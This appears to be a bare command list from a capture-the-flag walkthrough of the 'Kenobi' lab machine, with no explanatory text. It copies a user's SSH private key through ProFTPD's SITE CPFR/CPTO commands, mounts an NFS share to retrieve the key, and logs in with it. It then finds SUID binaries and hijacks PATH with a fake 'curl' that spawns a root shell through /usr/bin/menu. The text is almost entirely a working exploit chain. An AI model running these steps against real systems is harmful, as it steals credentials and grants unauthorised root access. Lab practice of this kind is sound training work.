
```shell
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```shell
SITE CPTO /var/tmp/id_rsa
```

```
mkdir /mnt/kenobiNFS  
```

```
mount machine_ip:/var /mnt/kenobiNFS  
```

```
ls -la /mnt/kenobiNFS
```

```
cp /mnt/kenobiNFS/tmp/id_rsa .
```

```
cp /mnt/kenobiNFS/tmp/id_rsa .
```

```
ssh -i id_rsa kenobi@10.10.10.10
```

```
find / -perm -u=s -type f 2>/dev/null
```

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
```